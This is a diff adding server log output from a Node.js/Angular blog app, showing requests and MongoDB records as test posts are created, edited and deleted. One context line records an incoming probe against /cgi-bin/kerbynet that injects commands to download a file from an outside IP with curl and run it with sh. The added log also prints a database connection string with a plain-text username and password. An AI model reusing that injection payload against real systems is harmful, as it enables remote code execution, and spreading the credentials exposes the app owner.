@@ -849,3 +849,248 @@ Getting Blog List
 [0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.055 ms - 1418[0m
 [0mGET / [32m200 [0m1.344 ms - 954[0m
 [0mGET / [32m200 [0m0.897 ms - 954[0m
+(node:6464) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
+(node:6464) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
+Mongoose connected to mongodb://cjfield:inprison@localhost/blogger
+[0mGET / [32m200 [0m5.808 ms - 4614[0m
+[0mGET /js/angular-route.min.js [32m200 [0m2.506 ms - 4595[0m
+[0mGET /stylesheets/style.css [36m304 [0m1.021 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.458 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m1.133 ms - -[0m
+[0mGET /css/fontawesome-all.css [36m304 [0m1.566 ms - -[0m
+[0mGET /js/angular.min.js [32m200 [0m1.371 ms - 158915[0m
+[0mGET /js/angular-ui-router.min.js [32m200 [0m3.078 ms - 114858[0m
+[0mGET /favicon.ico [32m200 [0m1.443 ms - 4614[0m
+Getting Blog List
+[
+  {
+    _id: 5f92155d605eb0192115982e,
+    blogTitle: 'Howdy there!',
+    blogText: 'Whats up pardner?',
+    createdOn: 2020-10-22T23:27:25.681Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m20.890 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m11.952 ms - -[0m
+[0mGET /webfonts/fa-solid-900.woff2 [36m304 [0m1.938 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m1.017 ms - -[0m
+Getting Blog List
+[
+  {
+    _id: 5f92155d605eb0192115982e,
+    blogTitle: 'Howdy there!',
+    blogText: 'Whats up pardner?',
+    createdOn: 2020-10-22T23:27:25.681Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m3.903 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.660 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.751 ms - -[0m
+{ blogTitle: 'First is the worst!', blogText: 'Does it work?' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work?',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mPOST /api/blogs/ [32m201 [0m20.714 ms - 142[0m
+Getting Blog List
+[
+  {
+    _id: 5f92155d605eb0192115982e,
+    blogTitle: 'Howdy there!',
+    blogText: 'Whats up pardner?',
+    createdOn: 2020-10-22T23:27:25.681Z,
+    __v: 0
+  },
+  {
+    _id: 5f9216b5638d43194015afa7,
+    blogTitle: 'First is the worst!',
+    blogText: 'Does it work?',
+    createdOn: 2020-10-22T23:33:09.838Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m3.018 ms - 268[0m
+[0mGET /favicon.ico [36m304 [0m0.627 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work?',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [32m200 [0m5.240 ms - 142[0m
+[0mGET /favicon.ico [36m304 [0m0.591 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work?',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [36m304 [0m2.411 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work?',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [36m304 [0m3.626 ms - -[0m
+[0mPUT /api/blogs/5f9216b5638d43194015afa7 [32m200 [0m6.353 ms - 151[0m
+Getting Blog List
+[
+  {
+    _id: 5f92155d605eb0192115982e,
+    blogTitle: 'Howdy there!',
+    blogText: 'Whats up pardner?',
+    createdOn: 2020-10-22T23:27:25.681Z,
+    __v: 0
+  },
+  {
+    _id: 5f9216b5638d43194015afa7,
+    blogTitle: 'First is the worst!',
+    blogText: 'Does it work? Seems to',
+    createdOn: 2020-10-22T23:33:09.838Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m2.625 ms - 277[0m
+[0mGET /favicon.ico [36m304 [0m0.572 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work? Seems to',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [32m200 [0m2.927 ms - 151[0m
+[0mGET /favicon.ico [36m304 [0m0.622 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work? Seems to',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [36m304 [0m2.323 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work? Seems to',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [36m304 [0m3.168 ms - -[0m
+[0mPUT /api/blogs/5f9216b5638d43194015afa7 [32m200 [0m4.887 ms - 151[0m
+Getting Blog List
+[
+  {
+    _id: 5f92155d605eb0192115982e,
+    blogTitle: 'Howdy there!',
+    blogText: 'Whats up pardner?',
+    createdOn: 2020-10-22T23:27:25.681Z,
+    __v: 0
+  },
+  {
+    _id: 5f9216b5638d43194015afa7,
+    blogTitle: 'First is the worst!',
+    blogText: 'Does it work? Seems to',
+    createdOn: 2020-10-22T23:33:09.838Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.389 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.576 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work? Seems to',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [32m200 [0m2.806 ms - 151[0m
+[0mGET /favicon.ico [36m304 [0m0.619 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work? Seems to',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [36m304 [0m2.191 ms - -[0m
+Finding blog details { blogid: '5f9216b5638d43194015afa7' }
+{
+  _id: 5f9216b5638d43194015afa7,
+  blogTitle: 'First is the worst!',
+  blogText: 'Does it work? Seems to',
+  createdOn: 2020-10-22T23:33:09.838Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f9216b5638d43194015afa7 [36m304 [0m3.099 ms - -[0m
+Deleting blog entry with id of 5f9216b5638d43194015afa7
+{}
+(node:6464) DeprecationWarning: Mongoose: `findOneAndUpdate()` and `findOneAndDelete()` without the `useFindAndModify` option set to false are deprecated. See: https://mongoosejs.com/docs/deprecations.html#findandmodify
+[0mDELETE /api/blogs/5f9216b5638d43194015afa7 [32m204 [0m4.156 ms - -[0m
+Getting Blog List
+[
+  {
+    _id: 5f92155d605eb0192115982e,
+    blogTitle: 'Howdy there!',
+    blogText: 'Whats up pardner?',
+    createdOn: 2020-10-22T23:27:25.681Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m2.058 ms - 133[0m
+[0mGET /favicon.ico [36m304 [0m0.610 ms - -[0m
+Finding blog details { blogid: '5f92155d605eb0192115982e' }
+{
+  _id: 5f92155d605eb0192115982e,
+  blogTitle: 'Howdy there!',
+  blogText: 'Whats up pardner?',
+  createdOn: 2020-10-22T23:27:25.681Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f92155d605eb0192115982e [32m200 [0m2.865 ms - 139[0m
+[0mGET /favicon.ico [36m304 [0m0.582 ms - -[0m
+Finding blog details { blogid: '5f92155d605eb0192115982e' }
+{
+  _id: 5f92155d605eb0192115982e,
+  blogTitle: 'Howdy there!',
+  blogText: 'Whats up pardner?',
+  createdOn: 2020-10-22T23:27:25.681Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f92155d605eb0192115982e [36m304 [0m2.108 ms - -[0m
+Finding blog details { blogid: '5f92155d605eb0192115982e' }
+{
+  _id: 5f92155d605eb0192115982e,
+  blogTitle: 'Howdy there!',
+  blogText: 'Whats up pardner?',
+  createdOn: 2020-10-22T23:27:25.681Z,
+  __v: 0
+}
+[0mGET /api/blogs/5f92155d605eb0192115982e [36m304 [0m2.143 ms - -[0m
+Deleting blog entry with id of 5f92155d605eb0192115982e
+{}
+[0mDELETE /api/blogs/5f92155d605eb0192115982e [32m204 [0m2.914 ms - -[0m
+Getting Blog List
+[]
+[0mGET /api/blogs [32m200 [0m1.664 ms - 2[0m
+[0mGET /favicon.ico [36m304 [0m0.620 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.728 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.629 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.677 ms - -[0m
